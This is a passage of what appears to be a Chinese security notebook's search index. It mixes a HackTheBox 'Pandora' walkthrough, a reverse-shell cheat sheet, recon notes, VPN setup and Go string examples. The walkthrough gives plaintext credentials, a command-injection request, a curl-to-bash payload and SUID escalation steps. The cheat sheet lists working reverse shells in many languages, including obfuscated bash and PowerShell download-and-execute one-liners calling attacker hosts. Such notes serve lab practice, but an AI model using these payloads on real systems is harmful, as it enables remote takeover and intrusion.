Responder","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/hackthebox-Responder/#hackthebox-responder","title":"hackthebox-Responder","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/hackthebox-Responder/#a","title":"a","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/linux%20%E5%8F%96%E5%BE%97shell%20%E5%90%8E%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/","title":"Linux \u53d6\u5f97shell \u540e\u6e17\u900f\u601d\u8def","text":"<p>python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.42',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\" \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 \u7248\u6743\u58f0\u660e\uff1a\u672c\u6587\u4e3aCSDN\u535a\u4e3b\u300cweixin_39890543\u300d\u7684\u539f\u521b\u6587\u7ae0\uff0c\u9075\u5faaCC 4.0 BY-SA\u7248\u6743\u534f\u8bae\uff0c\u8f6c\u8f7d\u8bf7\u9644\u4e0a\u539f\u6587\u51fa\u5904\u94fe\u63a5\u53ca\u672c\u58f0\u660e\u3002 \u539f\u6587\u94fe\u63a5\uff1ahttps://blog.csdn.net/weixin_39890543/article/details/112989316</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/pandora/","title":"Pandora","text":"<pre><code>10.129.134.46\nssh daniel@10.129.134.46\nHotelBabylon23\n\ng4e01qdgk36mfdh90hvcc54umq\n\n</code></pre> <p>\u914d\u7f6e\u7aef\u53e3\u8f6c\u53d1</p> <pre><code>ssh -fgN -L 8989:localhost:80 daniel@10.129.134.46\n</code></pre> <p>\u200b   </p> <p>\u914d\u7f6eproxychains</p> <pre><code>sudo vim /etc/proxychains.con\n[ProxyList]\n# add proxy here ...\n# meanwile\n# defaults set to \"tor\"\n# socks4    127.0.0.1 9050\nsocks5 127.0.0.1 9098 daniel HotelBabylon23\n</code></pre> <p>sqlmap</p> <pre><code>sqlmap --url=\"http://10.129.134.46:8989/pandora_console/include/chart_generator.php?session_id=''\" -D pandora -T tsessions_php --dump --batch\n\n</code></pre> <p>CVE-2020-8947</p> <pre><code>POST /pandora_console/ajax.php HTTP/1.1\n\npage=include%2fajax%2fevents&amp;perform_event_response=10000000&amp;target=whoami&amp;response_id=1\n</code></pre> <p>\u53cd\u5f39shell</p> <pre><code>$ cat shell.sh\n#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.10.14.6/1337 0&gt;&amp;1\n\n$ ls\nshll.sh\n\n$ python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n\n$ nc -nvlp 9999\n</code></pre> <p>payload</p> <pre><code>$ curl+10.10.14.6:80/shell.sh|bash\n</code></pre> <p>\u6743\u9650\u63d0\u5347</p> <pre><code>\u67e5\u627e\u6240\u6709\u5e26\u6709SUID\u6743\u9650\u7684\u6587\u4ef6\n$ find / -perm -4000 2&gt;/dev/null\n\n\n$ ls -al /usr/bin/pandora_backup\n\n$ /usr/bin/pandora_backup\n\n$ echo \"/bin/sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)\" | at now; tail -f /dev/null\n\n$ python -c \"import pty;pty.spawn('/bin/bash')\"\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/softether%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/","title":"SoftEther \u5b89\u88c5\u8fc7\u7a0b","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/softether%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/#softether-vpn","title":"\u5b89\u88c5softether VPN\u670d\u52a1\u7aef","text":"<pre><code>$ apt install softether-server\n$ systemctl start softether-vpnserver\n$ systemctl status softether-vpnserver\n\u25cf softether-vpnserver.service - SoftEther VPN Server\n     Loaded: loaded (/lib/systemd/system/softether-vpnserver.service; enabled; vendor preset: disabled)\n     Active: active (running) since Fri 2022-08-19 15:29:52 CST; 39min ago\n   Main PID: 690493 (vpnserver)\n      Tasks: 45 (limit: 16777216)\n     Memory: 30.7M\n        CPU: 1min 12.007s\n     CGroup: /system.slice/softether-vpnserver.service\n             \u251c\u2500690493 /usr/libexec/softether/vpnserver/vpnserver execsvc\n\n$ vpncmd\nvpncmd command - SoftEther VPN Command Line Management Utility Developer Edition\n\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7SNIP\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7\n1. Management of VPN Server or VPN Bridge\n2. Management of VPN Client\n3. Use of VPN Tools (certificate creation and Network Traffic Speed Test Tool)\n\nSelect 1, 2 or 3: \n</code></pre> <p>\u4f9d\u6b21\u8f93\u51651\u3001\u56de\u8f66\u3001\u56de\u8f66\u3002\u8fdb\u5165\u9ed8\u8ba4HUB\uff0c\u8bbe\u7f6e\u7ba1\u7406\u670d\u52a1\u5668\u5bc6\u7801\uff1a<code>ServerPasswordSet</code></p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/softether%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/#_1","title":"\u4f7f\u7528\u56fe\u5f62\u5316\u670d\u52a1\u5668\u7ba1\u7406\u8f6f\u4ef6\u8f7b\u677e\u914d\u7f6e","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/softether%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/#_2","title":"\u521b\u5efa\u7528\u6237","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/softether%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/#_3","title":"\u521b\u5efa\u672c\u5730\u6865\uff0c\u6865\u63a5\u7269\u7406\u7f51\u7edc\u63a5\u53e3\u5e76\u4f7f\u7528","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/softether%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/#ipsecl2tp-vpn","title":"\u5f00\u542fIPsec/L2TP VPN\u529f\u80fd\uff0c\u7ec8\u7aef\u8fde\u63a5","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/softether%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/#_4","title":"\u5ba2\u6237\u7aef\u6210\u529f\u8fde\u63a5","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/softether%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/#ipsecl2tp","title":"IPsec/L2TP\u8fde\u63a5","text":"<p>linux</p> <ol> <li>sudo apt-get update</li> <li>sudo apt-get install network-manager-l2tp-gnome</li> <li>sudo apt-get install xl2tpd</li> </ol> <p>\u7f51\u7edc\u8bbe\u7f6e-\u6dfb\u52a0vpn</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/src.meizu.com/","title":"Src.meizu.com","text":"<p>*.flyme.cn</p> <p>*.meizu.com</p> <p>*.meizu.cn</p> <p>whois</p> <p><code>whois flyme.cn</code></p> <p>cdn\u68c0\u6d4b</p> <p>https://mping.chinaz.com/flyme.cn</p> <p>\u6307\u7eb9\u8bc6\u522b</p> <p>https://sitereport.netcraft.com/?url=http://flyme.cn</p> <p>http://finger.tidesec.com/</p> <p>https://search.censys.io/search?resource=hosts&amp;sort=RELEVANCE&amp;per_page=25&amp;virtual_hosts=EXCLUDE&amp;q=flyme.cn</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86cheetsheet/","title":"\u8d44\u4ea7\u53d1\u73b0","text":"<p>\u8be5\u5907\u5fd8\u5f55\u4e3b\u8981\u7528\u4e8e\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u4fe1\u606f\u6536\u96c6\u9636\u6bb5\u5feb\u901f\u67e5\u6f0f\u8865\u7f3a\u3002</p> <p>\u8fd9\u4e2a\u9636\u6bb5\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u4e86\u89e3\u653b\u51fb\u9762\u3001\u4f7f\u7528\u7684\u6280\u672f\u3002\u5e76\u4e14\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53d1\u73b0\u5f00\u53d1\u73af\u5883\u751a\u81f3\u88ab\u9057\u5fd8\u548c\u672a\u7ef4\u62a4\u7684\u57fa\u7840\u8bbe\u65bd\uff0c\u8fd9\u4e9b\u57fa\u7840\u8bbe\u65bd\u53ef\u80fd\u5bfc\u81f4\u6211\u4eec\u8bbf\u95ee\u5185\u90e8\u7f51\u7edc\uff0c\u56e0\u4e3a\u5b83\u4eec\u901a\u5e38\u53d7\u5230\u8f83\u5c11\u7684\u4fdd\u62a4\u548c\u76d1\u63a7\u3002\u4fe1\u606f\u6536\u96c6\u901a\u5e38\u662f\u4e00\u4e2a\u8fed\u4ee3\u8fc7\u7a0b\u3002\u5f53\u6211\u4eec\u53d1\u73b0\u8d44\u4ea7\uff08\u4f8b\u5982\uff0c\u5b50\u57df\u6216\u865a\u62df\u4e3b\u673a\uff09\u65f6\uff0c\u6211\u4eec\u5c06\u9700\u8981\u5bf9\u6b63\u5728\u4f7f\u7528\u7684\u6280\u672f\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u5bfb\u627e\u9690\u85cf\u7684\u9875\u9762/\u76ee\u5f55\u7b49\uff0c\u8fd9\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6211\u4eec\u53d1\u73b0\u53e6\u4e00\u4e2a\u5b50\u57df\u5e76\u91cd\u65b0\u5f00\u59cb\u8be5\u8fc7\u7a0b\u3002 By academy.hackthebox.com</p> <p>\u641c\u5bfb\u516c\u53f8\u53ca\u5176\u5b50\u516c\u53f8\u6240\u6709\u8d44\u4ea7\uff0c\u786e\u8ba4\u5c5e\u4e8e\u76ee\u6807\u7684\u6240\u6709\u4e1c\u897f</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86cheetsheet/#_2","title":"\u57df&amp;\u5b50\u57df","text":"<p>whois</p> <p>\u57df\u540d\u6ce8\u518c\u4fe1\u606f\u67e5\u8be2</p> <p>\u53cd\u67e5 \u901a\u8fc7IP\u53cd\u67e5\u57df\u540d</p> <p>SITE MAP</p> <p>DNS</p> <p>\u5229\u7528dig\u3001nslookup\u67e5\u8be2\u57df\u540dA\u3001MX\u3001PTR\u3001CNAME\u8bb0\u5f55</p> <pre><code>A\u8bb0\u5f55\n$ nslookup facebook.com\n$ dig facebook.com @1.1.1.1\n\n\u5b50\u57df\u8bb0\u5f55\n$ nslookup -query=A www.facebook.com\n$ dig a www.facebook.com @1.1.1.1\n\nIP\u5730\u5740\u7684PTR\u8bb0\u5f55\n$ nslookup -query=PTR 1.2.3.4\n$ dig -x 1.2.3.4 @1.1.1.1\n\n\u4efb\u4f55\u73b0\u6709\u8bb0\u5f55\n$ nslookup -quert=ANY google.com\n$ dig any google.com @8.8.8.8\n\nTXT\u8bb0\u5f55\n$ nslookup -query=TXT facebook.com\n$ dig txt facebook.com @1.1.1.1\n\nMX\u8bb0\u5f55\n$ nslookup -query=MX facebook.com\n$ dig mx facebook.com @1.1.1.1\n\n\u7ed3\u5408whois\u67e5\u8be2\u9a8c\u8bc1\u4fe1\u606f\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86cheetsheet/#_3","title":"\u5b50\u57df\u540d\u53d1\u73b0","text":"<p>\u5728\u7ebf\u7f51\u7ad9</p> <pre><code>//\u5fae\u6b65\nhttps://x.threatbook.com/v5/domain/pingan.com\n//VirusTotal\nhttps://www.virustotal.com/gui/domain/pingan.com/relations\n//\u7ad9\u957f\u4e4b\u5bb6\nhttps://tool.chinaz.com/subdomain/pingan.com\n//\u4e0d\u77e5\u540d\u7f51\u7ad9 \u7ed3\u679c\u8be6\u7ec6 Github\uff1ahttps://github.com/bin-maker\nhttps://ruo.me/\n</code></pre> <p>\u4f7f\u7528VirusTotal\u641c\u7d22\u57df\u540d</p> <p>Project Sonar</p> <pre><code>https://sonar.omnisint.io/subdomains/{domain} - \u83b7\u53d6\u6240\u6709\u5b50\u57df\nhttps://sonar.omnisint.io/tlds/{domain}       - \u67e5\u8be2\u5176\u4ed6\u9876\u7ea7\u57df\u540d\nhttps://sonar.omnisint.io/all/{domain}        - \u67e5\u8be2\u6240\u6709\u76f8\u5173\u57df\u540d\nhttps://sonar.omnisint.io/reverse/{ip}        - IP\u53cd\u67e5\u57df\u540d\nhttps://sonar.omnisint.io/reverse/{ip}/{mask} - IP\u6bb5\u53cd\u67e5\u57df\u540d\n\n$ export TARGET=\"baidu.com\"\n$ curl -s https://sonar.omnisint.io/subdomains/$TARGET | jq -r '.[]' | sort -u\n$ curl -s https://sonar.omnisint.io/tlds/$TARGET | jq -r '.[]' | sort -u\n$ curl -s https://sonar.omnisint.io/reverse/$TARGET/24 | jq -r '.[]' | sort -u\n</code></pre> <p>\u8bc1\u4e66</p> <p>\u8bc1\u4e66\u900f\u660e\u5ea6(CT)\uff0c\u8981\u6c42\u5c06\u8bc1\u4e66\u9881\u53d1\u673a\u6784(CA)\u9881\u53d1\u7684\u6bcf\u4e2aSSL/TLS\u8bc1\u4e66\u90fd\u53d1\u4e0d\u5728\u53ef\u516c\u5f00\u8bbf\u95ee\u7684\u65e5\u5fd7\u4e2d\u3002</p> <p>site: https://search.censys.io/certificates?q=[doamin] https://crt.sh?q=[domain] tool: openssl</p> <pre><code>\u4f7f\u7528curl\u5904\u7406\u8f93\u51fa\n$ curl -s \"https://crt.sh/?q=${TARGET}&amp;output=json\" | jq -r '.[] | \"\\(.name_value)\\n\\(.common_name)\"' | sort -u &gt; \"${TARGET}_crt.sh.txt\"\n\n$ export TARGET=\"facebook.com\"\n$ export PORT=\"443\"\n$ openssl s_client -ign_eof 2&gt;/dev/null &lt;&lt;&lt;$'HEAD / HTTP/1.0\\r\\n\\r' -connect \"${TARGET}:${PORT}\" | openssl x509 -noout -text -in - | grep 'DNS' | sed -e 's|DNS:|\\n|g' -e 's|^\\*.*||g' | tr -d ',' | sort -u\n</code></pre> <p>\u81ea\u52a8\u5316\u88ab\u52a8\u5b50\u57df\u679a\u4e3e</p> <p>Netcraft</p> <p>\u641c\u7d22\u8bed\u6cd5</p> <p>site:\"\"</p> <p>\u5b57\u5178\u7206\u7834</p> <p>\u4f01\u4e1a\u67e5\u8be2</p> <p>tool:oneforall</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86cheetsheet/#ip","title":"IP\u8303\u56f4","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86cheetsheet/#_4","title":"\u7ec4\u4ef6","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86cheetsheet/#_5","title":"\u865a\u62df\u4e3b\u673a","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86cheetsheet/#_6","title":"\u7f51\u7edc\u7ed8\u6d4b","text":"<p>Fofa</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86cheetsheet/#_7","title":"\u9875\u9762\u5168\u91cf\u4fe1\u606f","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86cheetsheet/#_8","title":"\u654f\u611f\u4fe1\u606f","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86cheetsheet/#github","title":"Github \u654f\u611f\u4fe1\u606f\u53d1\u73b0","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86cheetsheet/#_9","title":"\u7f51\u76d8\u641c\u7d22","text":"<p>CDN\u8bc6\u522b\u53ca\u7ed5\u8fc7</p> <p>WAF\u8bc6\u522b</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%8F%8D%E5%BC%B9shell/","title":"\u53cd\u5f39shell","text":"<p><code>Linux</code> \u53cd\u5f39shell</p> <p>\u59ff\u52bf\u4e00\uff1a<code>bash</code> \u53cd\u5f39</p> <p>bash -i &gt;&amp; /dev/tcp/192.168.99.242/1234 0&gt;&amp;1base64\u7248\uff1abash-c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjI0Mi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}'\u5728\u7ebf\u7f16\u7801\u5730\u5740\uff1ahttp://www.jackson-t.ca/runtime-exec-payloads.html</p> <p>\u5176\u4ed6\u7248\u672c\uff1a</p> <p>exec 5&lt;&gt;/dev/tcp/192.168.99.242/1234;cat &amp;5 &gt;&amp;5;done</p> <p>exec/bin/sh 0&amp;0 2&gt;&amp;0</p> <p>\u59ff\u52bf\u4e8c\uff1a<code>nc</code> \u53cd\u5f39</p> <p>nc -e /bin/bash 192.168.99.242 1234</p> <p>\u59ff\u52bf\u4e09\uff1a<code>awk</code> \u53cd\u5f39</p> <p>awk 'BEGIN{s=\"/inet/tcp/0/192.168.99.242/1234\";for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)}'</p> <p>\u59ff\u52bf\u56db\uff1a<code>telnet</code> \u53cd\u5f39</p> <p>\u5907\u6ce8\uff1a\u9700\u8981\u5728\u653b\u51fb\u4e3b\u673a\u4e0a\u5206\u522b\u76d1\u542c1234\u548c4321\u7aef\u53e3\uff0c\u6267\u884c\u53cd\u5f39shell\u547d\u4ee4\u540e\uff0c\u57281234\u7ec8\u7aef\u8f93\u5165\u547d\u4ee4\uff0c4321\u67e5\u770b\u547d\u4ee4\u6267\u884c\u540e\u7684\u7ed3\u679c\u3002</p> <p>telnet 192.168.99.242 1234 | /bin/bash | telnet 192.168.99.242 4321</p> <p>\u59ff\u52bf\u4e94\uff1a<code>socat</code> \u53cd\u5f39</p> <p>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.99.242:1234</p> <p>\u59ff\u52bf\u516d\uff1a<code>Python</code> \u53cd\u5f39</p> <p>python -c \"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.99.242',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"</p> <p>import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.14.42\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn(\"sh\")</p> <p>\u59ff\u52bf\u4e03\uff1a<code>PHP</code> \u53cd\u5f39</p> <p>php -r '$sock=fsockopen(\"192.168.99.242\",1234);exec(\"/bin/sh -i &amp;3 2&gt;&amp;3\");'</p> <p>\u59ff\u52bf\u516b\uff1a<code>Perl</code> \u53cd\u5f39</p> <p>perl -e 'use Socket;$i=\"192.168.99.242\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'</p> <p>\u59ff\u52bf\u4e5d\uff1a<code>Ruby</code> \u53cd\u5f39</p> <p>ruby -rsocket -e'f=TCPSocket.open(\"192.168.99.242\",1234).to_i;exec sprintf(\"/bin/sh -i &amp;%d 2&gt;&amp;%d\",f,f,f)'</p> <p>\u59ff\u52bf\u5341\uff1a<code>Lua</code> \u53cd\u5f39</p> <p>lua -e \"require('socket');require('os');t=socket.tcp();t:connect('192.168.99.242','1234');os.execute('/bin/sh -i &amp;3 2&gt;&amp;3');\"</p> <p>\u59ff\u52bf\u5341\u4e00\uff1a<code>JAVA</code> \u53cd\u5f39</p> <p>public classRevs {/**</p> <ul> <li> <p>@param args</p> </li> <li> <p>@throws Exception*/</p> </li> </ul> <p>public static voidmain(String[] args) throws Exception {//TODO Auto-generated method stub</p> <p>Runtime r =Runtime.getRuntime();</p> <p>String cmd[]= {\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/10.10.14.15/4444;cat &amp;5 &gt;&amp;5; done\"};</p> <p>Process p=r.exec(cmd);</p> <p>p.waitFor();</p> <p>}</p> <p>}</p> <p>\u4fdd\u5b58\u4e3aRevs.java\u6587\u4ef6\uff0c\u7f16\u8bd1\u6267\u884c\uff0c\u6210\u529f\u53cd\u5f39shell\u3002</p> <p>javac Revs.java</p> <p>java Revs</p> <p><code>Windows</code> \u53cd\u5f39shell</p> <p>\u59ff\u52bf\u4e00\uff1a<code>nc</code> \u53cd\u5f39</p> <p>netcat \u4e0b\u8f7d\uff1ahttps://eternallybored.org/misc/netcat/</p> <p>\u670d\u52a1\u7aef\u53cd\u5f39\uff1anc 192.168.99.242 1234 -e c:\\windows\\system32\\cmd.exe</p> <p>\u59ff\u52bf\u4e8c\uff1a<code>powershell</code> \u53cd\u5f39</p> <p>powercat\u662fnetcat\u7684powershell\u7248\u672c\uff0c\u529f\u80fd\u514d\u6740\u6027\u90fd\u8981\u6bd4netcat\u597d\u7528\u7684\u591a\u3002</p> <p>PS C:\\WWW&gt;powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.99.242 -p 1234 -e cmd</p> <p>\u4e0b\u8f7d\u5230\u76ee\u6807\u673a\u5668\u672c\u5730\u6267\u884c\uff1a</p> <p>PS C:\\WWW&gt; Import-Module ./powercat.ps1PS C:\\WWW&gt; powercat -c 192.168.99.242 -p 1234 -e cmd</p> <p>\u59ff\u52bf\u4e09\uff1a<code>MSF</code> \u53cd\u5f39shell</p> <p>\u4f7f\u7528msfvenom\u751f\u6210\u76f8\u5173Payload</p> <p>msfvenom -l payloads | grep 'cmd/windows/reverse'msfvenom-p cmd/windows/reverse_powershell LHOST=192.168.99.242 LPORT=1234</p> <p>\u59ff\u52bf\u56db\uff1a<code>Cobalt strike</code> \u53cd\u5f39shell</p> <p>1\u3001\u914d\u7f6e\u76d1\u542c\u5668\uff1a\u70b9\u51fbCobalt Strike\u2014\u2014&gt;Listeners\u2014\u2014&gt;\u5728\u4e0b\u65b9Tab\u83dc\u5355Listeners\uff0c\u70b9\u51fbadd\u30022\u3001\u751f\u6210payload\uff1a\u70b9\u51fbAttacks\u2014\u2014&gt;Packages\u2014\u2014&gt;Windows Executable\uff0c\u4fdd\u5b58\u6587\u4ef6\u4f4d\u7f6e\u30023\u3001\u76ee\u6807\u673a\u6267\u884cpowershell payload</p> <p>\u59ff\u52bf\u4e94\uff1a<code>Empire</code> \u53cd\u5f39shell</p> <p>usestager windows/launcher_vbs</p> <p>infosetListener test</p> <p>execute</p> <p>\u59ff\u52bf\u516d\uff1a<code>nishang</code> \u53cd\u5f39shell</p> <p>Reverse TCP shell\uff1a</p> <p>powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com /samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.1.1.210 -port 1234</p> <p>Reverse UDP shell\uff1a</p> <p>powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellUdp.ps1');Invoke-PowerShellUdp -Reverse -IPAddress 10.1.1.210 -port 1234</p> <p>\u59ff\u52bf\u4e03\uff1a<code>Dnscat</code> \u53cd\u5f39shell</p> <p>github\u9879\u76ee\u5730\u5740\uff1a</p> <p>https://github.com/iagox86/dnscat2</p> <p>\u670d\u52a1\u7aef\uff1a</p> <p>ruby dnscat2.rb --dns \"domain=lltest.com,host=xx.xx.xx.xx\" --no-cache -e open -e open</p> <p>\u76ee\u6807\u4e3b\u673a\uff1a</p> <p>powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1');Start-Dnscat2 -Domain lltest.com -DNSServer xx.xx.xx.xx \u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014 \u7248\u6743\u58f0\u660e\uff1a\u672c\u6587\u4e3aCSDN\u535a\u4e3b\u300cweixin_39890543\u300d\u7684\u539f\u521b\u6587\u7ae0\uff0c\u9075\u5faaCC 4.0 BY-SA\u7248\u6743\u534f\u8bae\uff0c\u8f6c\u8f7d\u8bf7\u9644\u4e0a\u539f\u6587\u51fa\u5904\u94fe\u63a5\u53ca\u672c\u58f0\u660e\u3002 \u539f\u6587\u94fe\u63a5\uff1ahttps://blog.csdn.net/weixin_39890543/article/details/112989316</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%8415%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/","title":"\u5b57\u7b26\u4e32\u768415\u79cd\u5e38\u7528\u7528\u6cd5","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%8415%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/#_1","title":"\u83b7\u53d6\u957f\u5ea6","text":"<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"unicode/utf8\"\n)\n\nfunc main() {\n    var name string = \"\u8001\u738b\"\n\n    fmt.Println( len(name) )                //\u83b7\u53d6 \u5b57\u8282\u957f\u5ea6\uff0c\u8f93\u51fa\uff1a6\n    fmt.Println( utf8.RuneCountInString(name) ) //\u83b7\u53d6\u5b57\u7b26\u957f\u5ea6\uff0c\u8f93\u51fa\uff1a2\n}\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%8415%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/#xx","title":"\u662f\u5426\u4ee5xx\u5f00\u5934","text":"<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"strings\"\n)\n\nfunc main() {\n    name := \"\u8001\u738b666\"\n\n    result := strings.HasPreFix(name, \"\u8001\")\n\nfmt.Println(result)     //\u8f93\u51fa\uff1atrue\n}\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%8415%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/#xx_1","title":"\u662f\u5426\u4ee5xx\u7ed3\u5c3e","text":"<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"strings\"\n)\n\nfunc main() {\n    name := \"\u6b66\u5927\u90ce\"\n\n    result := strings.HasSuffix(name, \"\u90ce\")\n\n    fmt.Println(result)     //\u8f93\u51fa\uff1atrue\n}\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%8415%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/#_2","title":"\u662f\u5426\u5305\u542b","text":"<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"strings\"\n)\n\nfunc main() {\n    name := \"\u62ac\u8001\u5b50\u7684\u610f\u5927\u5229\u70ae\u6765\"\n    result := strings.Contains(name, \"\u8001\u5b50\")\n\n    fmt.Println(result)     // \u8f93\u51fa\uff1atrue\n}\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%8415%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/#_3","title":"\u53d8\u5927\u5199","text":"<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"strings\"\n)\n\nfunc main() {\n    name := \"this is xiaoxie\"\n\n    result := strings.ToUpper(name)\n\n    fmt.Println(result)     //\u8f93\u51fa\uff1aTHIS IS XIAOXIE\n}\n//\u6ce8\u610f\uff1aresult\u8f6c\u6362\u4e3a\u5927\u5199\uff0cname\u4e0d\u53d8\u3002\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%8415%E7%A7%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/#_4","title":"\u53d8\u5c0f\u5199","text":"<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"strings\"\n)\n\nfunc main() {\n    name := \"THIS IS DAXIE\"\n\n    result := strings.ToLower(name)\n\n    fmt.Println(result)     //\u8f93\u51fa\uff1athis is 